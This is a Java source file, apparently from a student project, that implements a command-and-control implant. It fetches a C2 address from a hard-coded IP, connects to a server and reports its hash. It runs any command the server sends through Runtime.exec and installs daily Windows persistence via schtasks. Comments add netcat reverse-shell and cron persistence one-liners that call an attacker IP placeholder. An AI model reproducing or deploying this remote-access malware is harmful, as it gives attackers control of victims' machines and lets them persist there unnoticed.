import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class implant {

    private static Socket sock = null;
    private static OutputStream dout = null;
    private static InputStream din = null;

    public static String GetC2IP() {
        String res;
        try {
            URL url = new URL("http://54.221.167.111/api/download");
            String FakeOutProf = "MWAHAHAHAHHA YOU FOOOL";

            URLConnection conn = url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length", Integer.toString(FakeOutProf.length()));

            try (DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
                dos.writeBytes(FakeOutProf);
            }

            try (BufferedReader bf = new BufferedReader(new InputStreamReader(
                    conn.getInputStream()))) {
                res = bf.readLine();
            }

        } catch (Exception e) {
            // TODO handle exception better
            System.out.println("someting bad getting c2 ip");
            System.out.println(e);
            res = "toodaloo";
        }
        return res;
    }

    public static void MakeServerConn(String IP, int Port) {
        try {
            sock = new Socket(IP, Port);
        } catch (Exception e) {
            // TODO: handle exception
            System.out.println("someting bad making port");
            System.out.println(e);
        }
    }

    public static void CloseConnection() {
        try {
            sock.close();
            din.close();
            dout.close();

        } catch (Exception e) {
            // TODO: handle exception
            System.out.println("Someting bad closing connection");
        }

    }

    public static int SendMsgToServer(String Message) {
        // TODO: Encrypt all traffic sent
        try {
            dout = sock.getOutputStream();
            byte[] msgInBytes = Message.getBytes("UTF-8");
            dout.write(msgInBytes);
            dout.flush();
        } catch (Exception e) {
            // TODO: handle exception
            System.out.println("someting bad sending");
            System.out.println(e);

        }
        return 0;
    }

    public static String RecvMsgFromServer() {
        // TODO: decrypt encrypted traffic
        String decodedReply = "";
        try {
            din = sock.getInputStream();
            byte[] reply = new byte[100];
            int replyLen = din.read(reply);
            decodedReply = new String(reply, StandardCharsets.UTF_8);
            decodedReply = decodedReply.trim();
        } catch (Exception e) {
            // TODO: handle exception
            System.out.println("someting bad receiving");
            System.out.println(e);
        }

        return decodedReply;
    }

    public static void SelfDestruct() {
        /*------------------------Self Destruct PSEUDOCODE------------------------------*/

        /*
         * if (ipNotRetrievableForTwoWeeks == True){
         * try {
         * Files.deleteIfExists(
         * Paths.get("/home/secret/implant.class"));
         * }
         * catch (NoSuchFileException e) {
         * System.out.println(
         * "No such file/directory exists");
         * }
         * catch (DirectoryNotEmptyException e) {
         * System.out.println("Directory is not empty.");
         * }
         * catch (IOException e) {
         * System.out.println("Invalid permissions.");
         * }
         * 
         * System.out.println("Deletion successful.");
         * }
         */
    }

    public static String GetArchitecture() {
        return System.getProperty("os.name").toLowerCase();
    }

    public static void POCPersistenceLinux() {
        // this stuff below is a proof of concept for running bash commands in java,
        // eventually it will implement our persistence mechanism
        // reverse shell on startup, we won't use this probably
        // nano ~/.bashrc
        // nc -e /bin/bash <KALI-IP> <PORT> 2>/dev/null &
        // nc -nvlp <PORT>
        /*
         * String s;
         * Process p;
         * try {
         * List<String> commands = new ArrayList<String>();
         * commands.add("sudo");
         * commands.add("crontab");
         * commands.add("-l");
         * commands.add("2>/dev/null;");
         * commands.add("echo");
         * commands.add("\"0");
         * commands.add("1");
         * commands.add("*");
         * commands.add("*");
         * commands.add("*");
         * commands.add("whoami\")");
         * commands.add("|");
         * commands.add("crontab");
         * commands.add("-");
         * ProcessBuilder builder = new ProcessBuilder(commands);
         * p = builder.start();
         * p.waitFor();
         * System.out.println(p.getErrorStream());
         * } catch (Exception e) {
         * System.out.println("oop");
         * }
         * 
         */
    }

     //This function creates a task scheduler on a windows device to start the implant daily
    public static void POCPersistenceWindows() {
        try{
          List<String> commands = new ArrayList<String>();
          commands.add("schtasks.exe");
          commands.add("/CREATE");
          commands.add("/SC");
          commands.add("DAILY");
          commands.add("/TN");
          commands.add("AABBB");
          commands.add("/TR");
          //NOTE: This part needs to be replaced with the path to the implant!!
          commands.add("C:/Users/cornd/OneDrive/Desktop/putty.exe");
          commands.add("/ST");
          //change this if you want to change what time it starts at (current 9:42pm)
          commands.add("21:42");
          
          ProcessBuilder builder = new ProcessBuilder(commands);
          Process p = builder.start();

          p.waitFor();
          System.out.println(p.exitValue());
        }
        catch(Exception e){
          System.out.println("2"); 
        }
    }
    
    public static void EstablishPersistence() {
        // TODO: check for persistence before establishing
        /*
         * Another persistence mechanism for linux using a CRON JOB:
         * Periodically sends reverse shell to host machine as often as needed,
         * Note: requires netcat-traditional to be installed on victims machine.
         * CT=$(crontab -l)
         * CT=$CT$'\n10 * * * * nc -e /bin/bash <ATTACKER_IP> <PORT>'
         * printf "$CT" | crontab -
         */
    }

    public static void DownloadFile(String fn) {

    }

    public static void HandleServerCommand(String message) {
        // System.out.println(message);
        String[] msgArr = message.split(" ", 2);
        String command = msgArr[0];
        String commBdy = null;
        // System.out.println(command);
        if (msgArr.length > 1) {
            commBdy = msgArr[1];
            // System.out.println(commBdy);
        }

        if (command.equals("na")) {
        } else if (command.equals("bc")) {
            try {
                Runtime.getRuntime().exec(commBdy);
            } catch (Exception e) {
                // TODO: handle exception
                System.out.println("Someting bad running command");
            }
        }
    }

    public static void main(String[] args) {

        // START CODE FOR MAIN HERE

        // hash currently running implant
        String currHash = "1651029148";

        // check system architecture and run accordingly. .bashrc vs windowsStartup,
        String os = GetArchitecture();
        if (os.matches("linux")) {

        } else if (os.matches("windows")) {

        }

        // Check for persistence
        // setup persistence if not established

        // retrieve IP for c2 from
        // XORwCustomString(base64(freeram.net/superlongendpointstringthatreturnsWhateverIPweCurrentlyAreusing))

        // if IP hasnt been retrievable for x days, self destruct

        String c2IP = GetC2IP();

        MakeServerConn("0.0.0.0", 5000);

        String reply;

        // send hash of running implant
        SendMsgToServer("hash " + currHash);

        // receive hash of most updated implant from server
        reply = RecvMsgFromServer();
        if (!reply.equals(currHash)) {
            SendMsgToServer("update");
            reply = RecvMsgFromServer();
            System.out.println(reply);
            // TODO: download most recent implant from server
            // run that implant, delete current implant
        } else {
            System.out.println("Same hash...");
        }

        // send message asking what to do
        SendMsgToServer("what");
        // receive answer
        reply = RecvMsgFromServer();
        HandleServerCommand(reply);

        CloseConnection();
    }
}
